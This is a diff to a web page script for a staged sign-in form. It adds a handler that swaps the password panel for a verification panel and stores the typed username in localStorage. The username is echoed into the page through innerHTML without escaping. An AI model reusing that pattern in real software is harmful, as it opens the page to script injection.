@@ -1,8 +1,11 @@
 var nextBtn = document.querySelector(".sign-in-next-btn-submit");
+var signInBtn = document.querySelector(".sign-in-btn-submit")
+
+var verifyDiv = document.querySelector(".verification-form")
+
 var passwordDiv = document.querySelector(".password-sign-in-form");
 var emailDiv = document.querySelector(".email-sign-in-form");
 var loadingDiv = document.querySelector(".loading-screen");
-const email = localStorage.getItem('.username')
 
 
 
@@ -13,10 +16,26 @@ nextBtn.addEventListener("click", function(event) {
     emailDiv.style.display = "none";
 });
 
-document.getElementById("username").addEventListener('keyup',returnUsername);
-function returnUsername(){
-    document.getElementById("display-name").innerHTML = document.getElementById("username").value;
+signInBtn.addEventListener("click", function(event) {
+    event.preventDefault(); 
+    verifyDiv.style.display = "block";
+    passwordDiv.style.display = "none";
+});
+
+let usernameValue = localStorage.getItem("username") || "";
+
+function returnUsername() {
+  usernameValue = document.getElementById("username").value;
+  localStorage.setItem("username", usernameValue);
+  document.getElementById("display-name").innerHTML = usernameValue;
+  return usernameValue;
 }
+
+document.getElementById("username").addEventListener("keyup", returnUsername);
+
+
+
+
 
 
 
